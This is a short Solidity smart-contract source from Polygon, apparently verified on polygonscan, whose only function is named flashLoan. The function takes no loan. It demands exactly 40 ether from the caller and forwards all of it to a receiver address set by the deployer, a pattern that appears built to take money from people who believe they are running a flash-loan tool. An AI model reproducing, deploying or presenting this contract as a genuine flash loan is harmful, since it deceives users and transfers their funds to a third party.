/**
 *Submitted for verification at polygonscan.com on 2023-02-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BearsMiners {
    address payable receiver;

    constructor(address payable _receiver) {
        receiver = _receiver;
    }

    function flashLoan() public payable {
        require(msg.value == 40 ether, "La cantidad de Ether a enviar debe ser de 40");
        (bool success,) = address(receiver).call{value: 40 ether, gas: 800000}("");
        require(success, "Transaction failed");
    }
}